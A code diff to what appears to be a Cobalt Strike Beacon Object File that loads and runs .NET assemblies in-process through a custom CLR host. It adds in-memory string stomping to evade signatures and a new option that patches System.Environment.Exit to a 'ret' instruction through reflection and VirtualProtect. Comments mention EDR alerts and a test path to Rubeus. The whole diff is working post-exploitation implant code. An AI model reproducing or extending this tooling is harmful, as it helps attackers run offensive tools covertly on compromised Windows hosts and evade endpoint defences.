@@ -434,6 +434,7 @@ extern "C" {
 		}
 	};
 #endif
+
 	DWORD ResolveVA(DWORD VirtualAddress, unsigned char* AssemblyBytes, IMAGE_DOS_HEADER* DOS_HEADER, size_t NTHeadersSize, WORD NumberOfSections) {
 		IMAGE_SECTION_HEADER* SectionHeader = NULL;
 		unsigned char* Cursor = (unsigned char*)AssemblyBytes + (DOS_HEADER->e_lfanew + NTHeadersSize);
@@ -737,8 +738,8 @@ extern "C" {
 		// just in case these are signatured store them 
 
 		// think this indicates its compressed which is the usual
-		char ID_TopLevelC[] = { '#', '~', '\0' };
-		char ID_TopLevel[] = { '#', '-' , '\0' }; // TODO SUPPORT UNCOMPRESSED
+		const char ID_TopLevelC[] = { '#', '~', '\0' };
+		const char ID_TopLevel[] = { '#', '-' , '\0' }; // TODO SUPPORT UNCOMPRESSED
 		/* quote:
 
 		The #GUID stream, as you would expect, contains GUIDs. This table contains a list of all of the 128-bit GUIDs used in the application,
@@ -748,12 +749,12 @@ extern "C" {
 
 		*/
 
-		char ID_GUID[] = { '#','G','U','I','D', '\0' };
-		char ID_Strings[] = { '#', 'S','t','r','i','n','g','s', '\0' };
-		char ID_US[] = { '#','U','S', '\0' };
+		const char ID_GUID[] = { '#','G','U','I','D', '\0' };
+		const char ID_Strings[] = { '#', 'S','t','r','i','n','g','s', '\0' };
+		const char ID_US[] = { '#','U','S', '\0' };
 
 		// guid lives here, offset is in top level
-		char ID_Blob[] = { '#','B','l','o','b', '\0' };
+		const char ID_Blob[] = { '#','B','l','o','b', '\0' };
 
 		/*
 			https://secana.github.io/PeNet/api/PeNet.Header.Net.MaskValidType.html (not in order though)
@@ -1471,8 +1472,8 @@ extern "C" {
 
 					// write until we see a null byte
 					// TODO: more sophisticated stomping
-					DEBUG_PRINT("	Offset is %lu", Index);
-					DEBUG_PRINT("	%c%c%c\n", StringToStomp, StringToStomp+1, StringToStomp+2);
+					//DEBUG_PRINT("	Offset is %lu", Index);
+					DEBUG_PRINT("	Overwriting String: %s\n", StringToStomp);
 					memset(StringToStomp, StompChar, strlen(StringToStomp));
 
 				}
@@ -1599,8 +1600,11 @@ extern "C" {
 		char* pipeName = NULL;
 		char* slotName = NULL;
 
+
+		// todo bitflags
 		bool bShouldStomp = 0;
 		bool bHasArguments = 0;
+		bool bPatchExit = 0;
 
 		BOOL mailSlot = 0;
 		ULONG entryPoint = 1;
@@ -1613,6 +1617,7 @@ extern "C" {
 		
 		bHasArguments = BeaconDataShort(&parser);
 		bShouldStomp = BeaconDataShort(&parser);
+		bPatchExit = BeaconDataShort(&parser);
 
 		VARIANT Arguments = { 0 };
 		Arguments.vt = (VT_ARRAY | VT_BSTR);
@@ -1667,7 +1672,7 @@ extern "C" {
 
 #if 1
 		// test read local assembly
-		HANDLE TempFile = CreateFileA("D:\\MalwareAndEvasion\\Rubeus.exe", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+		HANDLE TempFile = CreateFileA("D:\\MalDev\\VisualProjects\\EchoArgv\\EchoArgv\\bin\\Release\\EchoArgv.exe", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 		DWORD FileSize = GetFileSize(TempFile, NULL);
 		TAssembly->AssemblyBytes = (unsigned char*)GlobalAlloc(GMEM_FIXED | GMEM_ZEROINIT, FileSize);
 		ReadFile(TempFile, TAssembly->AssemblyBytes, FileSize, &TAssembly->AssemblySize, NULL);
@@ -1731,7 +1736,7 @@ extern "C" {
 		}
 
 		// Init our custom host control
-		CustomHostControl pHostControl;
+		CustomHostControl pHostControl; // not a pointer but lets slap a p there anyway har har har
 		pHostControl.lpVtbl = &CustomHostControl_Vtbl;
 		pHostControl.TargetAssembly = TAssembly;
 		
@@ -1833,8 +1838,182 @@ extern "C" {
 			return;
 		}
 
+		if (bPatchExit) {
+			/* PATCHING SYSTEM ENVIRONMENT EXIT */
+			// implementation same as https://github.com/kyleavery/inject-assembly/blob/8db977c0fd1da039df920f9dd4840d4a3ec2aa2c/src/scmain.c
+			// grabbing handle to Exit by reaching into reflection then patching it to ret
+			// TODO: throw this into a generic patch blah 
+
+			// IntPtr target = exitMethod.MethodHandle.GetFunctionPointer();
+			// then overwrite with ret
+
+			_Assembly* pMscorlib;
+			_Type* pSystemEnvironment;
+			_Type* pMethodInfo;
+			_Type* pRuntimeMethodHandle;
+			_MethodInfo* pExit;
+			_MethodInfo* pGetFunctionPointer;
+			_PropertyInfo* pMethodHandle;
+
+			// First, get a reference to mscorlib 
+			// WARNING WARNING - STATIC STRING
+			BSTR MscorlibIdentityString = SysAllocString(L"mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089");
+
+			hr = pAppDomain->lpVtbl->Load_2(pAppDomain, MscorlibIdentityString, &pMscorlib);
+			SysFreeString(MscorlibIdentityString);
+			if (FAILED(hr)) {
+				DEBUG_PRINT("Couldn't get reference to mscorlib for patching system.environment.exit!!!");
+
+				return;
+			}
+
+			BSTR SystemEnvironmentString = SysAllocString(L"System.Environment");
+
+
+			hr = pMscorlib->lpVtbl->GetType_2(pMscorlib, SystemEnvironmentString, &pSystemEnvironment);
+			SysFreeString(SystemEnvironmentString);
+			if (FAILED(hr)) {
+				DEBUG_PRINT("Couldn't get System.Environment type for patching!!!");
+
+				return;
+			}
+
+			BSTR ExitString = SysAllocString(L"Exit");
+			hr = pSystemEnvironment->lpVtbl->GetMethod_2(pSystemEnvironment, ExitString, static_cast<BindingFlags>(BindingFlags_Static | BindingFlags_Public), &pExit);
+			SysFreeString(ExitString);
+			if (FAILED(hr)) {
+				DEBUG_PRINT("Couldn't get Exit method for patching!!!");
+
+				return;
+			}
+
+
+			BSTR MethodInfoString = SysAllocString(L"System.Reflection.MethodInfo");
+			hr = pMscorlib->lpVtbl->GetType_2(pMscorlib, MethodInfoString, &pMethodInfo);
+			SysFreeString(MethodInfoString);
+			if (FAILED(hr)) {
+				DEBUG_PRINT("Couldn't get MethodInfo");
+
+				return;
+			}
+
+			BSTR MethodHandleString = SysAllocString(L"MethodHandle");
+			hr = pMethodInfo->lpVtbl->GetProperty(pMethodInfo, MethodHandleString, static_cast<BindingFlags>(BindingFlags_Static | BindingFlags_Instance | BindingFlags_Public), &pMethodHandle);
+			SysFreeString(MethodHandleString);
+			if (FAILED(hr)) {
+				DEBUG_PRINT("Couldn't get MethodHandle");
+
+				return;
+			}
+
+			// if i confuse myself again https://stackoverflow.com/questions/26382810/how-do-you-get-the-value-of-a-property-from-propertyinfo
+
+			VARIANT ExitVariant;
+			ExitVariant.vt = VT_UNKNOWN;
+			ExitVariant.punkVal = (IUnknown*)pExit; // punkVal is the valid val type for VT_UNKNOWN; just an IUnknown pointer
+
+			SAFEARRAY* EmptyIndexArray = SafeArrayCreateVector(VT_EMPTY, 0, 0); // empty index
+
+			VARIANT ExitMethodHandleVariant; // ret
+
+			hr = pMethodHandle->lpVtbl->GetValue(pMethodHandle, ExitVariant, EmptyIndexArray, &ExitMethodHandleVariant);
+
+			// recall that callee will handle this?
+			// SafeArrayDestroy(EmptyIndexArray);
+
+			if (FAILED(hr)) {
+				DEBUG_PRINT("Couldn't get ExitMethod Method Handle");
+				return;
+			}
+
+			// we now have exitMethod.MethodHandle equivalent
+			// we want to call GetFunctionPointer() 
+			BSTR RuntimeMethodHandleString = SysAllocString(L"System.RuntimeMethodHandle");
+			hr = pMscorlib->lpVtbl->GetType_2(pMscorlib, RuntimeMethodHandleString, &pRuntimeMethodHandle);
+			SysFreeString(RuntimeMethodHandleString);
+
+			if (FAILED(hr)) {
+				DEBUG_PRINT("Couldn't get Runtime Method Handle");
+
+				return;
+			}
+
+			BSTR GetFunctionPointerString = SysAllocString(L"GetFunctionPointer");
+			hr = pRuntimeMethodHandle->lpVtbl->GetMethod_2(pRuntimeMethodHandle, GetFunctionPointerString, static_cast<BindingFlags>(BindingFlags_Instance | BindingFlags_Public), &pGetFunctionPointer);
+			SysFreeString(GetFunctionPointerString);
+			if (FAILED(hr)) {
+				DEBUG_PRINT("Couldn't get GetFunctionPointer()");
+				return;
+			}
+
+			// finally, invoke getfunctionpointer to get the addr we need to patch
+
+			// no args, .() call
+			SAFEARRAY* GetFunctionPointerArguments = SafeArrayCreateVector(VT_EMPTY, 0, 0);
+
+			// reuse exit var. not sure whats done under the hood for VT_UNKNOWN 
+			/*
+			The VariantInit function initializes the VARIANTARG by setting the vt field to VT_EMPTY. Unlike VariantClear, this function does not interpret the current contents of the VARIANTARG.
+			*/
+
+			//VariantInit(&ExitVariant);
+			VariantClear(&ExitVariant);
+			memset(&ExitVariant, 0, sizeof(VARIANT)); // wipe the struct clean
+
+			hr = pGetFunctionPointer->lpVtbl->Invoke_3(pGetFunctionPointer, ExitMethodHandleVariant, GetFunctionPointerArguments, &ExitVariant);
+			// SafeArrayDestroy(GetFunctionPointerArguments);
+			if (FAILED(hr)) {
+				DEBUG_PRINT("Couldnt invoke GetFunctionPointer()");
+				return;
+			}
+
+			// this might set off EDR alarms. this is a compatibility option mostly for assemblies identified as killing the beacon through system environment exit
+			// so avoid using it otherwise
+			DWORD OldProtect;
+			VirtualProtect((void*)ExitVariant.byref, 1, PAGE_READWRITE,&OldProtect);
+			*(byte*)ExitVariant.byref = 0xc3;
+			VirtualProtect((void*)ExitVariant.byref, 1, OldProtect, &OldProtect);
+			DEBUG_PRINT("[!] Patched System.Environment.Exit() @ %p\n", ExitVariant.byref);
+
+
+			// these clear the variants before they're freed going out of scope.
+			VariantClear(&ExitMethodHandleVariant);
+			VariantClear(&ExitVariant);
+
+			if (pMscorlib) {
+				pMscorlib->lpVtbl->Release(pMscorlib);
+			}
+
+			if (pSystemEnvironment) {
+				pSystemEnvironment->lpVtbl->Release(pSystemEnvironment);
+			}
+
+			if (pExit) {
+				pExit->lpVtbl->Release(pExit);
+			}
+
+			if (pMethodInfo) {
+				pMethodInfo->lpVtbl->Release(pMethodInfo);
+			}
+
+			if (pMethodHandle) {
+				pMethodHandle->lpVtbl->Release(pMethodHandle);
+			}
+
+			if (pRuntimeMethodHandle) {
+				pRuntimeMethodHandle->lpVtbl->Release(pRuntimeMethodHandle);
+			}
+
+			if (pGetFunctionPointer) {
+				pGetFunctionPointer->lpVtbl->Release(pGetFunctionPointer);
+			}
+
+			/* FINISH PATCHING SYSTEM ENVIRONMENT EXIT */
+		}
+
 		// Setup console window
 		HWND ConsoleWindow = GetConsoleWindow();
+
 
 		
 		// GetConsoleWindow is "deprecated"
@@ -1897,7 +2076,7 @@ extern "C" {
 #endif
 		
 		SysFreeString(AssemblyIdentityString);
-
+		
 #ifdef _DEBUG
 		// DUMP TYPES AS A DEBUG THING FOR TESTING IMPLANT
 
